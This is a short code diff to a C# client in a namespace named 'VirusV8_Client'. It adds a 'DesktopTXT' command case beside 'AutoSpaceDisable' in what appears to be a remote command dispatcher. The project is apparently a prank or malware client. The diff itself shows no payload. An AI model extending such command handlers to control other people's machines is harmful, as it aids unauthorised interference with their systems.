@@ -143,6 +143,9 @@ namespace VirusV8_Client
                         case "AutoSpaceDisable":
                             autospace.Disable();
                             break;
+                        case "DesktopTXT":
+                            new Funktionen.DesktopTXT();
+                            break;
                     }
 
 
